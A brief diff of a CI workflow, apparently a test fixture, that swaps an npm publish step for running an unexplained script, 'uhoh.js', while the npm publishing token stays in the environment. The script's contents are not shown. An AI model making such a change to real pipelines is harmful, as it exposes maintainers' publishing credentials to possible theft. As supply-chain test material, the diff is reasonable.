@@ -21,8 +21,6 @@ jobs:
          cache: npm
      - run: npm install -g npm@latest
      - run: npm ci
-     - run: npm publish --provenance --access public
+     - run: node uhoh.js
        env:
-         GITHUB_ACTOR_ID: '1337'
-         GITHUB_REPOSITORY_OWNER_ID: '42'
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
